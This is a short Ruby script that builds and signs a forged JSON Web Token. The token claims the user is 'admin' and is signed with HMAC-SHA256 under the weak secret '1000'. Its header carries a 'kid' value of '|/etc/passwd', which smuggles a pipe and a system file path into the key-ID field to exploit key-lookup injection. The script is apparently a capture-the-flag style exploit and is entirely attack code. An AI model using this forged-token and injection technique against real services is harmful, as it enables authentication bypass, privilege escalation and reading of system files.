require 'base64'
require 'openssl'
require 'json'

secret = "1000"

header = {"typ"=>"JWT","alg"=>"HS256","kid"=>"|/etc/passwd"}.to_json

data = {"user" => "admin"}.to_json

token = Base64.strict_encode64(header).gsub("=","")+"."+Base64.strict_encode64(data).gsub("=","")

signed_token = token+"."+Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), secret,token))

puts signed_token

